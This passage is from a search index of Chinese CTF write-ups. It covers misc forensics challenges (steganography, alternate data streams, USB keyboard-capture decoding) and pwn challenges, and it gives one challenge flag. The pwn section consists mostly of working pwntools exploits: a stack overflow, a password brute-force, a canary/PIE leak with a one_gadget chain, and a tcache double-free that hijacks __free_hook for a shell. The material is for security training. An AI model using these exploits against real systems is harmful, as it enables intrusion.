base64\uff0c\u89e3\u7801\u770b\u89c1\u4e00\u6bb5\u4ee3\u7801\uff1a \u540d\u5b57\u7b49\u4e8e des\uff0cvalue \u5c31\u662f\u5bc6\u6587\uff0cstr \u5c31\u662f\u89e3\u5bc6\u5bc6\u94a5\uff0c\u53ef\u4ee5\u770b\u5230\u5c06\u89e3\u5bc6\u5bc6\u94a5\u4f20\u8fdb\u51fd\u6570\u6700\u540e\u4f1a\u5f97\u5230 conclusion\uff0c\u89c2\u5bdf\u51fd\u6570\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u662f rot13 \u52a0\u5bc6\uff0c\u7f51\u4e0a\u627e\u5230\u89e3\u5bc6\u4ee3\u7801\uff0c\u89e3\u5bc6 conclusion \u5f97\u51fa str=\u201cabcdefgh\u201d \u6700\u540e des \u89e3\u5bc6\u5f97\u51fa flag: flag{1810fc7a8e865dd5} stream \u00b6 \u8003\u67e5\u8981\u70b9\uff1a ADS\uff08\u6570\u636e\u4ea4\u6362\u6d41\uff09 \u4e0b\u8f7d\u9898\u76ee\u540e\u662f\u4e00\u4e2a rar \u538b\u7f29\u5305 \u6253\u5f00\u8be5\u538b\u7f29\u5305\u53d1\u73b0\u538b\u7f29\u5305\u635f\u574f \u4f7f\u7528\u4e8c\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u538b\u7f29\u5305\uff0c\u53d1\u73b0 rar \u6587\u4ef6\u5934\u635f\u574f \u8865\u5168 rar \u6587\u4ef6\u5934\uff0c\u4f7f\u7528 winrar \u8fdb\u884c\u89e3\u538b\uff0c\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u6587\u4ef6\u5939\u4e2d\u6709 flag.txt \u6587\u4ef6 \u6839\u636e\u9898\u610f stream\uff0c\u53ef\u4ee5\u731c\u6d4b\u9898\u76ee\u8003\u67e5\u7684\u662f\u6587\u4ef6\u6d41\uff0c\u4f7f\u7528 lads \u5de5\u5177\u68c0\u6d4b\u6587\u4ef6\u5939\u53d1\u73b0\u5b58\u5728\u6587\u4ef6\u6d41 \u5728\u547d\u4ee4\u884c\u4e2d\u901a\u8fc7 notepad E:\\documents\\CTF \u9898\u76ee\u6574\u7406\\\u7b2c\u4e00\u5c4a\u56db\u5ddd\u5927\u5b66\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b\\f7b44cfafd5c52223d5498196c8a2e7b:realflag.txt \u8bbf\u95ee\u771f\u6b63\u7684 flag \u6587\u4ef6 \u5f97\u5230 flag \u6d41\u91cf\u5206\u6790 \u00b6 \u8003\u67e5\u8981\u70b9\uff1a USB \u534f\u8bae \u4e0b\u8f7d\u6587\u4ef6\u540e\u53d1\u73b0\u662f\u4e00\u4e2a\u6d41\u91cf\u6587\u4ef6\uff0c\u4f7f\u7528 wireshark \u6253\u5f00 \u4f7f\u7528 tshark \u63d0\u53d6 usbdata.txt \u7f16\u5199\u811a\u672c mappings = { 0x04:\"A\", 0x05:\"B\", 0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\", 0x0B:\"H\", 0x0C:\"I\", 0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\", 0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\", 0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\", 0X2B:\" \", 0x2C:\" \", 0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\", 0x30:\"]\", 0x31:\"\\\", 0x32:\"~\", 0x33:\";\", 0x34:\"'\", 0x36:\",\", 0x37:\".\" } nums = [] keys = open('usbdata.txt') for line in keys: \u200b if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0': \u200b continue \u200b nums.append(int(line[6:8],16)) keys.close() output = \"\" for n in nums: \u200b if n == 0 : \u200b continue \u200b if n in mappings: \u200b output += mappings[n] \u200b else: \u200b output += '[unknown]' \u200b print( 'output :\\n' + output) \u8fd0\u884c\u811a\u672c\uff0c\u5f97\u5230 flag find others \u00b6 \u8003\u67e5\u8981\u70b9\uff1a png \u6587\u4ef6\u5934 \u4e8c\u7ef4\u7801\u683c\u5f0f \u4e0b\u8f7d\u9644\u4ef6\u5f97\u5230\u4e00\u5f20\u56db\u5206\u4e4b\u4e00\u4e8c\u7ef4\u7801 \u6839\u636e\u9898\u76ee\u610f\u601d\u9700\u8981\u5f97\u5230\u53e6\u5916\u5176\u4ed6\u4e09\u4e2a\u90e8\u5206\uff0c\u4f7f\u7528\u4e8c\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u56fe\u7247\uff0c\u53d1\u73b0\u6709\u5176\u4ed6\u4e09\u5f20\u56fe\u7247\u7684\u6570\u636e\uff0c\u4f46\u662f png \u5934\u635f\u574f\u4e86\uff0c\u5c06\u5176\u8865\u5168\u5e76\u63d0\u53d6\u51fa\u6765\uff0c\u5f97\u5230\u56db\u5f20\u56fe\u7247\uff0c\u62fc\u63a5\u8d77\u6765\u540e\u53cd\u8272\u5f97\u5230\u4e8c\u7ef4\u7801\uff0c\u4f7f\u7528\u624b\u673a\u626b\u63cf\u83b7\u5f97 flag \u4e8c\u7ef4\u7801 flag audio \u00b6 \u4e0b\u8f7d\u9644\u4ef6\uff0c\u662f\u4e00\u4e2a\u97f3\u9891\u6587\u4ef6\uff0c\u8bd5\u542c\u540e\u53d1\u73b0\u662f\u6469\u65af\u7535\u7801\u7684\u58f0\u97f3 \u53ef\u4ee5\u76f4\u63a5\u7528\u542c\u7684\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u97f3\u9891\u7f16\u8f91\u8f6f\u4ef6\u6bd4\u5982 audition \u6253\u5f00\u540e\uff0c\u5c06\u5176\u6ce2\u5f62\u8f6c\u6362\u6210\u6469\u65af\u7535\u7801 \u8f6c\u6362\u6210\u6469\u65af\u7535\u7801 \u4f7f\u7528\u5de5\u5177\u6216\u8005\u5728\u7ebf\u5de5\u5177\u8f6c\u6362\u6210\u82f1\u6587","title":"MISC"},{"location":"WriteUp/201905/Misc/#misc","text":"","title":"MISC"},{"location":"WriteUp/201905/Misc/#_1","text":"","title":"\u5a49\u59d0\u59d0\u7684\u5185\u5b58\u955c\u50cf"},{"location":"WriteUp/201905/Misc/#_2","text":"\u5185\u5b58\u9690\u5199","title":"\u8003\u67e5\u8981\u70b9"},{"location":"WriteUp/201905/Misc/#_3","text":"\u4f7f\u7528 Volatility \u67e5\u770b\u526a\u5207\u677f\u4fe1\u606f\uff0c\u53d1\u73b0\u4e00\u6bb5 Base64 \u7f16\u7801\uff0c\u4f46\u663e\u793a\u4e0d\u5168\u3002 \u4f7f\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u6587\u4ef6\uff0c\u641c\u7d22\u8fd9\u6bb5 base64 \u7684\u5934 c2NlY3Rm \u83b7\u5f97\u5b8c\u6574\u7684 base64\uff0c\u89e3\u7801\u83b7\u5f97 flag\u3002","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"WriteUp/201905/Misc/#_4","text":"","title":"\u8c01\u662f\u534f\u4f1a\u6700\u5f3a\u7684\u4eba"},{"location":"WriteUp/201905/Misc/#_5","text":"\u6587\u4ef6\u62fc\u63a5","title":"\u8003\u67e5\u8981\u70b9"},{"location":"WriteUp/201905/Misc/#_6","text":"\u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u662f\u5f20\u56fe\u7247\uff0c\u663e\u793a\u7684\u662f JS \u4e4b\u7236\uff08\u6240\u4ee5\u653e\u8fd9\u5f20\u56fe\u662f\u4e3a\u63d0\u5021\u5f00\u6e90 \uff09\uff0c\u76f4\u63a5\u62d6\u8fdb HxD \u770b\u770b\u6709\u4ec0\u4e48\uff0c\u62c9\u5230\u6700\u540e\u770b\u5230\uff1a \u5f88\u660e\u663e\u7684 base64\uff0c\u89e3\u7801\u770b\u89c1\u4e00\u6bb5\u4ee3\u7801\uff1a \u540d\u5b57\u7b49\u4e8e des\uff0cvalue \u5c31\u662f\u5bc6\u6587\uff0cstr \u5c31\u662f\u89e3\u5bc6\u5bc6\u94a5\uff0c\u53ef\u4ee5\u770b\u5230\u5c06\u89e3\u5bc6\u5bc6\u94a5\u4f20\u8fdb\u51fd\u6570\u6700\u540e\u4f1a\u5f97\u5230 conclusion\uff0c\u89c2\u5bdf\u51fd\u6570\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u662f rot13 \u52a0\u5bc6\uff0c\u7f51\u4e0a\u627e\u5230\u89e3\u5bc6\u4ee3\u7801\uff0c\u89e3\u5bc6 conclusion \u5f97\u51fa str=\u201cabcdefgh\u201d \u6700\u540e des \u89e3\u5bc6\u5f97\u51fa flag: flag{1810fc7a8e865dd5}","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"WriteUp/201905/Misc/#stream","text":"\u8003\u67e5\u8981\u70b9\uff1a ADS\uff08\u6570\u636e\u4ea4\u6362\u6d41\uff09 \u4e0b\u8f7d\u9898\u76ee\u540e\u662f\u4e00\u4e2a rar \u538b\u7f29\u5305 \u6253\u5f00\u8be5\u538b\u7f29\u5305\u53d1\u73b0\u538b\u7f29\u5305\u635f\u574f \u4f7f\u7528\u4e8c\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u538b\u7f29\u5305\uff0c\u53d1\u73b0 rar \u6587\u4ef6\u5934\u635f\u574f \u8865\u5168 rar \u6587\u4ef6\u5934\uff0c\u4f7f\u7528 winrar \u8fdb\u884c\u89e3\u538b\uff0c\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u6587\u4ef6\u5939\u4e2d\u6709 flag.txt \u6587\u4ef6 \u6839\u636e\u9898\u610f stream\uff0c\u53ef\u4ee5\u731c\u6d4b\u9898\u76ee\u8003\u67e5\u7684\u662f\u6587\u4ef6\u6d41\uff0c\u4f7f\u7528 lads \u5de5\u5177\u68c0\u6d4b\u6587\u4ef6\u5939\u53d1\u73b0\u5b58\u5728\u6587\u4ef6\u6d41 \u5728\u547d\u4ee4\u884c\u4e2d\u901a\u8fc7 notepad E:\\documents\\CTF \u9898\u76ee\u6574\u7406\\\u7b2c\u4e00\u5c4a\u56db\u5ddd\u5927\u5b66\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b\\f7b44cfafd5c52223d5498196c8a2e7b:realflag.txt \u8bbf\u95ee\u771f\u6b63\u7684 flag \u6587\u4ef6 \u5f97\u5230 flag","title":"stream"},{"location":"WriteUp/201905/Misc/#_7","text":"\u8003\u67e5\u8981\u70b9\uff1a USB \u534f\u8bae \u4e0b\u8f7d\u6587\u4ef6\u540e\u53d1\u73b0\u662f\u4e00\u4e2a\u6d41\u91cf\u6587\u4ef6\uff0c\u4f7f\u7528 wireshark \u6253\u5f00 \u4f7f\u7528 tshark \u63d0\u53d6 usbdata.txt \u7f16\u5199\u811a\u672c mappings = { 0x04:\"A\", 0x05:\"B\", 0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\", 0x0B:\"H\", 0x0C:\"I\", 0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\", 0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\", 0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\", 0X2B:\" \", 0x2C:\" \", 0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\", 0x30:\"]\", 0x31:\"\\\", 0x32:\"~\", 0x33:\";\", 0x34:\"'\", 0x36:\",\", 0x37:\".\" } nums = [] keys = open('usbdata.txt') for line in keys: \u200b if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0': \u200b continue \u200b nums.append(int(line[6:8],16)) keys.close() output = \"\" for n in nums: \u200b if n == 0 : \u200b continue \u200b if n in mappings: \u200b output += mappings[n] \u200b else: \u200b output += '[unknown]' \u200b print( 'output :\\n' + output) \u8fd0\u884c\u811a\u672c\uff0c\u5f97\u5230 flag","title":"\u6d41\u91cf\u5206\u6790"},{"location":"WriteUp/201905/Misc/#find-others","text":"\u8003\u67e5\u8981\u70b9\uff1a png \u6587\u4ef6\u5934 \u4e8c\u7ef4\u7801\u683c\u5f0f \u4e0b\u8f7d\u9644\u4ef6\u5f97\u5230\u4e00\u5f20\u56db\u5206\u4e4b\u4e00\u4e8c\u7ef4\u7801 \u6839\u636e\u9898\u76ee\u610f\u601d\u9700\u8981\u5f97\u5230\u53e6\u5916\u5176\u4ed6\u4e09\u4e2a\u90e8\u5206\uff0c\u4f7f\u7528\u4e8c\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u56fe\u7247\uff0c\u53d1\u73b0\u6709\u5176\u4ed6\u4e09\u5f20\u56fe\u7247\u7684\u6570\u636e\uff0c\u4f46\u662f png \u5934\u635f\u574f\u4e86\uff0c\u5c06\u5176\u8865\u5168\u5e76\u63d0\u53d6\u51fa\u6765\uff0c\u5f97\u5230\u56db\u5f20\u56fe\u7247\uff0c\u62fc\u63a5\u8d77\u6765\u540e\u53cd\u8272\u5f97\u5230\u4e8c\u7ef4\u7801\uff0c\u4f7f\u7528\u624b\u673a\u626b\u63cf\u83b7\u5f97 flag \u4e8c\u7ef4\u7801 flag","title":"find others"},{"location":"WriteUp/201905/Misc/#audio","text":"\u4e0b\u8f7d\u9644\u4ef6\uff0c\u662f\u4e00\u4e2a\u97f3\u9891\u6587\u4ef6\uff0c\u8bd5\u542c\u540e\u53d1\u73b0\u662f\u6469\u65af\u7535\u7801\u7684\u58f0\u97f3 \u53ef\u4ee5\u76f4\u63a5\u7528\u542c\u7684\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u97f3\u9891\u7f16\u8f91\u8f6f\u4ef6\u6bd4\u5982 audition \u6253\u5f00\u540e\uff0c\u5c06\u5176\u6ce2\u5f62\u8f6c\u6362\u6210\u6469\u65af\u7535\u7801 \u8f6c\u6362\u6210\u6469\u65af\u7535\u7801 \u4f7f\u7528\u5de5\u5177\u6216\u8005\u5728\u7ebf\u5de5\u5177\u8f6c\u6362\u6210\u82f1\u6587","title":"audio"},{"location":"WriteUp/201905/Pwn/","text":"PWN \u00b6 babystack \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u53d8\u91cf\u5728\u6808\u5e27\u4e2d\u7684\u4f4d\u7f6e\u5173\u7cfb \u6808\u6ea2\u51fa \u89e3\u9898\u8fc7\u7a0b \u00b6 from pwn import * p = remote ( '119.23.206.23' , 10001 ) p . recvuntil ( 'what \\' s your name? \\n ' ) p . send ( 'a' * 0x10 + ' \\x33 ' ) p . interactive () login \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 strncmp \u51fd\u6570\u4f5c\u7528 python \u7206\u7834\u811a\u672c\u7f16\u5199 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u53d1\u73b0\u7a0b\u5e8f\u4e2d\u6bcf\u6b21\u4e0e flag \u7684\u6bd4\u8f83\u90fd\u662f\u4f7f\u7528\u7684 strncmp\uff0c\u56e0\u6b64\u53ef\u4ee5\u9010\u5b57\u8282\u7206\u7834 \u6ce8\uff1a strncmp(\"sc\", \"scuctf{...}\", 2) == 0 from pwn import * context . log_level = 'critical' table = list ( string . printable ) current = '' while ( True ): #p = process('./login') p = remote ( '119.23.206.23' , 10002 ) p . recvuntil ( 'What your name? \\n ' ) p . sendline ( 'hgy' ) for i in table : tmp = current + i p . recvuntil ( 'Your password :' ) p . send ( tmp ) res = p . recvline () if \"Welcome\" in res : current += i print current p . close () break p . interactive () noflag \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u6808\u6ea2\u51fa canary \u7ed5\u8fc7 rop \u89e3\u9898\u8fc7\u7a0b \u00b6 \u5728 main \u51fd\u6570\u4e2d\u5b58\u5728\u4e24\u6b21\u8f93\u5165\uff0c\u7b2c\u4e00\u6b21\u8f93\u51fa\u4f1a\u88ab\u91cd\u65b0\u6253\u5370\u51fa\u6765\u3002 \u56e0\u4e3a\u4f7f\u7528\u7684 read \u63a5\u53d7\u7684\u8f93\u5165\uff0c\u6240\u4ee5\u5728\u5b57\u7b26\u4e32\u672b\u5c3e\u4e0d\u4f1a\u6dfb\u52a0'\\0'\uff0c\u90a3\u4e48\u5728\u8f93\u51fa\u65f6\u5c31\u4e0d\u4f1a\u622a\u65ad\uff0c\u7531\u6b64\u53ef\u4ee5\u4e00\u6b21\u6027\u6cc4\u9732\u51fa\u6808\u4e0a\u7684 canary \u548c\u7a0b\u5e8f\u6bb5\u5730\u5740\u3002 \u53ea\u8981\u8f93\u5165 0x29 \u4e2a'a',\u5c31\u80fd\u6070\u597d\u8986\u76d6\u6389 canary \u6700\u4f4e\u4f4d\u7684'\\x00'\uff0c\u7136\u540e\u5f53\u7a0b\u5e8f\u8f93\u51fa\u65f6\uff0c\u5c31\u53ef\u4ee5\u6210\u529f\u6cc4\u9732\u51fa canary \u4ee5\u53ca\u5b83\u540e\u9762\u7684\u4e00\u4e2a\u4ee3\u7801\u6bb5\u7684\u5730\u5740\u3002\u8be5\u4ee3\u7801\u6bb5\u5730\u5740\u4e0e\u4ee3\u7801\u6bb5\u57fa\u5740\u6709\u4e00\u4e2a\u56fa\u5b9a\u7684\u504f\u79fb\uff0c\u51cf\u53bb\u8be5\u504f\u79fb\u65e2\u53ef\u83b7\u5f97\u57fa\u5740\u3002\u5230\u6b64\uff0c\u4e5f\u5c31\u540c\u65f6\u7ed5\u8fc7\u4e86 pie \u548c canary\u3002 \u7136\u540e\u7a0b\u5e8f\u4f1a\u63a5\u53d7\u7b2c\u4e8c\u6b21\u8f93\u5165\uff0c\u8fd9\u6b21\u8f93\u5165\u5c31\u9700\u8981\u4fee\u590d\u521a\u521a\u88ab\u4fee\u6539\u6389\u6700\u540e\u4e00\u5b57\u8282\u7684 canary\uff0c\u540c\u65f6\u5c06\u8fd4\u56de\u5730\u5740\u4fee\u6539\u4e3a main \u51fd\u6570\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e8c\u6b21\u5229\u7528\u6f0f\u6d1e\u4e86 \u5728\u7b2c\u4e8c\u6b21\u6267\u884c main \u51fd\u6570\u4e2d\uff0c\u5728\u8f93\u5165\u65f6\u8f93\u5165 0xc0 \u4e2a'a'\uff0c\u5c31\u53ef\u4ee5\u6cc4\u9732\u51fa\u4e00\u4e2a\u4f4d\u4e8e ld \u4e2d\u7684\u5730\u5740\uff0c\u6539\u5730\u5740\u5230 libc \u57fa\u5740\u7684\u504f\u79fb\u56fa\u5b9a\uff0c\u6240\u4ee5\u7531\u6b64\u53ef\u4ee5\u6cc4\u9732\u51fa libc \u7684\u57fa\u5740\u3002 \u5728\u7b2c\u4e8c\u6b21\u8f93\u5165\u65f6\uff0c\u7531\u4e8e\u6cc4\u9732\u51fa\u4e86 libc \u57fa\u5740\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7 rop \u4e3a\u6240\u6b32\u4e3a\u4e86 2333\u3002\u8fd9\u91cc exp \u662f\u7528\u7684 one_gadget\uff0c\u56e0\u4e3a\u4e8b\u5148\u5df2\u7ecf\u901a\u8fc7 rop \u6cc4\u9732\u51fa\u7684\u51fd\u6570\u5730\u5740\u5f97\u5230\u4e86\u8fdc\u7a0b\u7684 libc \u7248\u672c\u4e3a 2.23(rop \u4ee3\u7801\u5c31\u4e0d\u7ed9\u51fa\u4e86)\u3002 from pwn import * p = process ( './noflag' ) p . recvuntil ( 'length of name: \\n ' ) p . sendline ( str ( 0x29 )) p . recvuntil ( 'name: \\n ' ) p . send ( 'a' * 0x29 ) p . recvuntil ( 'a' * 0x28 ) canary = u64 ( p . recvn ( 8 )) / 0x100 * 0x100 pie = u64 ( p . recvuntil ( 'l' )[: - 1 ] . ljust ( 8 , ' \\x00 ' )) - 0xe10 print \"canary: %#x \" % canary print \"pie: %#x \" % pie main = pie + 0xd21 p . recvuntil ( 'of introduction: \\n ' ) p . sendline ( str ( 0x40 )) p . recvuntil ( 'introduction: \\n ' ) p . send ( 'a' * 0x28 + p64 ( canary ) + p64 ( 0xdeadbeef ) + p64 ( main )) p . recvuntil ( 'length of name: \\n ' ) p . sendline ( str ( 0xc0 )) p . recvuntil ( 'name: \\n ' ) p . send ( 'a' * 0xc0 ) p . recvuntil ( 'a' * 0xc0 ) libc_base = u64 ( p . recvuntil ( 'l' )[: - 1 ] . ljust ( 8 , ' \\x00 ' )) - 0x3da7cb print \"libc_base: %#x \" % libc_base one_gadget = libc_base + 0x4526a payload = 'a' * 0x28 + p64 ( canary ) + p64 ( 0xdeadbeef ) + p64 ( one_gadget ) payload = payload . ljust ( 0xc0 , ' \\x00 ' ) p . recvuntil ( 'of introduction: \\n ' ) p . sendline ( str ( 0xc0 )) p . recvuntil ( 'introduction: \\n ' ) p . send ( payload ) p . interactive () \u7136\u800c\u8fd9\u9898\u4e0d\u6b62\u4e00\u4e2a\u89e3\uff0c\u53ef\u4ee5\u4e0d\u7528\u6cc4\u9732 libc\uff0c\u901a\u8fc7\u6784\u9020 rop \u8c03\u7528 fopen \u548c fscanf \u6765\u8bfb\u53d6 flag \u4e5f\u884c\uff0c\u4e0d\u8fc7\u5c31\u9ebb\u70e6\u4e86\u8bb8\u591a\u3002 club \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u901a\u8fc7\u5199\u6cc4\u9732\u5806\u5730\u5740\u63a8\u6d4b libc \u7248\u672c fastbin attack \u901a\u8fc7 unsorted bin \u6cc4\u9732 libc tcache \u5229\u7528 \u89e3\u9898\u601d\u8def \u00b6 \u68c0\u67e5\u9898\u76ee\u4fdd\u62a4\uff0c\u53d1\u73b0\u4fdd\u62a4\u5168\u5f00 \u9996\u5148\u8fde\u7eed\u6dfb\u52a0\u591a\u4e2a member\uff0c\u7136\u540e\u518d\u4f9d\u6b21\u91ca\u653e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e8c\u4e2a member\uff0c\u4f7f\u5f97\u7b2c\u4e8c\u4e2a chunk \u7684 fd \u6307\u5411\u4e86\u7b2c\u4e00\u4e2a chunk \u7684\u5730\u5740\u3002\u518d\u6b21\u5c06\u7b2c\u4e8c\u4e2a chunk \u5206\u914d\u51fa\u6765\uff0cname \u8bbe\u7f6e\u4e3a'b'\uff0c\u8fd9\u53ea\u4f1a\u4fee\u6539\u6389\u5806\u5730\u5740\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u901a\u8fc7 edit(1, 'b')\u8f93\u51fa\u8be5 chunk \u7684 fd\u3002\u53ef\u4ee5\u53d1\u73b0\uff0c\u5730\u5740\u7684\u7b2c 3 \u4f4d\u4e0d\u4e3a 0\uff0c\u800c\u662f 2\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u5806\u4e0a\u4e8b\u5148\u5206\u914d\u4e86\u4e00\u4e2a 0x200 \u5927\u5c0f\u4ee5\u4e0a\u7684 chunk\uff0c\u8054\u7cfb\u5230 libc2.27 \u4ee5\u4e0a\u4f1a\u5728\u5806\u4e0a\u5f00\u8f9f\u4e00\u4e2a 0x250 \u5927\u5c0f\u7684\u7a7a\u95f4\u7528\u4e8e\u7ba1\u7406 tcache\uff0c\u4ece\u800c\u786e\u5b9a\u6587\u4ef6\u73af\u5883\u662f\u5b58\u5728 tcache \u7684\u3002 \u89c2\u5bdf\u5230\u6bcf\u6b21 remove \u90fd\u4f1a\u6e05\u7a7a name\uff0c\u4f46\u662f\u5f53\u6211 remove \u65f6\u53ea\u8f93\u5165\u56de\u8f66\uff0c\u5c31\u4f1a\u5bfc\u81f4'\\0'\u4e0e'\\0'\u6bd4\u8f83\uff0c\u4ece\u800c\u4f7f\u5df2\u7ecf free \u7684\u5806\u5757\u518d\u6b21\u88ab\u91ca\u653e\uff0c\u9020\u6210 double free\u3002\u7531\u56e0\u4e3a\u5177\u6709 tcache\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5728\u4efb\u610f\u5730\u5740\u5206\u914d chunk\u3002 \u4e3a\u4e86\u6cc4\u9732 libc \u7684\u57fa\u5740\uff0c\u5148\u901a\u8fc7 double free\uff0c\u5728\u5806\u4e0a\u5206\u914d\u4e00\u4e2a\u9519\u4f4d\u4e86 chunk\uff0c\u4ece\u800c\u53ef\u4ee5\u4fee\u6539\u6389\u4e00\u4e2a\u6b63\u5e38\u5806\u5757 victim \u7684 size\uff0c\u5c06 size \u4fee\u6539\u4e3a 0xc1\uff0c\u4f7f\u5176\u53d8\u6210\u4e00\u4e2a smallchunk\uff0c\u7136\u540e\u91ca\u653e\u6389 victim\uff0c\u5c31\u53ef\u4ee5\u5728 fd \u548c bk \u7684\u4f4d\u7f6e\u83b7\u5f97 libc \u4e2d\u7684\u5730\u5740\u3002\u518d\u6b21\u5c06\u8be5\u5904\u5185\u5b58\u5206\u914d\u51fa\u6765\uff0c\u5c31\u53ef\u4ee5\u6cc4\u9732\u51fa libc \u7684\u5730\u5740\u4e86\u3002 \u901a\u8fc7 double free \u5728__free_hook \u5904\u5206\u914d chunk\uff0c\u7136\u540e\u5199\u5165 libc2.27 \u7684 one_gadget \u7684\u5730\u5740\u6210\u529f getshell from pwn import * context . log_level = 'debug' p = process ( \"./contact\" ) libc = ELF ( './libc.so.6' ) #libc\u7248\u672c\u4e3a2.27 def add ( name , description ): p . recvuntil ( '> ' ) p . sendline ( '1' ) p . recvuntil ( 'name: ' ) p . sendline ( name ) p . recvuntil ( 'description(max 0x29bytes): \\n ' ) p . send ( description ) def remove ( name ): p . recvuntil ( '> ' ) p . sendline ( '2' ) p . recvuntil ( 'name of member: \\n ' ) p . sendline ( name ) def edit ( idx , description ): p . recvuntil ( '> ' ) p . sendline ( '3' ) p . recvuntil ( 'number of member: \\n ' ) p . sendline ( str ( idx )) p . recvuntil ( 'new description: \\n ' ) p . send ( description ) add ( 'a' , 'a' ) add ( 'b' , 'b' ) add ( 'c' , 'c' ) add ( 'd' , 'd' ) add ( 'e' , 'e' ) add ( 'x' , 'x' ) add ( 'x' , 'x' ) remove ( 'x' ) remove ( 'x' ) remove ( 'a' ) remove ( '' ) add ( 'a' , 'a' ) edit ( 0 , 'a' ) p . recvuntil ( 'a: ' ) heap_base = u64 ( p . recvline ()[: - 1 ] . ljust ( 8 , ' \\x00 ' )) / 0x1000 * 0x1000 + 0x250 print \"heap_base: %#x \" % heap_base payload = p64 ( heap_base + 0x30 ) edit ( 0 , payload ) add ( 'f' , 'f' ) payload = p64 ( 0 ) * 3 + p64 ( 0xc1 ) add ( 'g' , payload ) remove ( 'b' ) for _ in range ( 7 ): remove ( '' ) add ( 'b' , 'b' ) edit ( 1 , 'a' * 8 ) p . recvuntil ( 'b: aaaaaaaa' ) libc_base = u64 ( p . recvline ()[: - 1 ] . ljust ( 8 , ' \\x00 ' )) - 0x3ebd50 free_hook = libc_base + libc . symbols [ '__free_hook' ] one_gadget = libc_base + 0x4f322 print \"libc_base: %#x \" % libc_base print \"free_hook: %#x \" % free_hook edit ( 1 , p64 ( 0 )) remove ( 'a' ) remove ( '' ) add ( 'a' , p64 ( free_hook )) add ( 't' , '/bin/sh \\x00 ' ) add ( 'p' , p64 ( one_gadget )) remove ( 't' ) p . interactive ()","title":"PWN"},{"location":"WriteUp/201905/Pwn/#pwn","text":"","title":"PWN"},{"location":"WriteUp/201905/Pwn/#babystack","text":"","title":"babystack"},{"location":"WriteUp/201905/Pwn/#_1","text":"\u53d8\u91cf\u5728\u6808\u5e27\u4e2d\u7684\u4f4d\u7f6e\u5173\u7cfb \u6808\u6ea2\u51fa","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"WriteUp/201905/Pwn/#_2","text":"from pwn import * p = remote ( '119.23.206.23' , 10001 ) p . recvuntil ( 'what \\' s your name? \\n ' ) p . send ( 'a' * 0x10 + ' \\x33 ' ) p . interactive ()","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"WriteUp/201905/Pwn/#login","text":"","title":"login"},{"location":"WriteUp/201905/Pwn/#_3","text":"strncmp \u51fd\u6570\u4f5c\u7528 python \u7206\u7834\u811a\u672c\u7f16\u5199","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"WriteUp/201905/Pwn/#_4","text":"\u53d1\u73b0\u7a0b\u5e8f\u4e2d\u6bcf\u6b21\u4e0e flag \u7684\u6bd4\u8f83\u90fd\u662f\u4f7f\u7528\u7684 strncmp\uff0c\u56e0\u6b64\u53ef\u4ee5\u9010\u5b57\u8282\u7206\u7834 \u6ce8\uff1a strncmp(\"sc\", \"scuctf{...}\", 2) == 0 from pwn import * context . 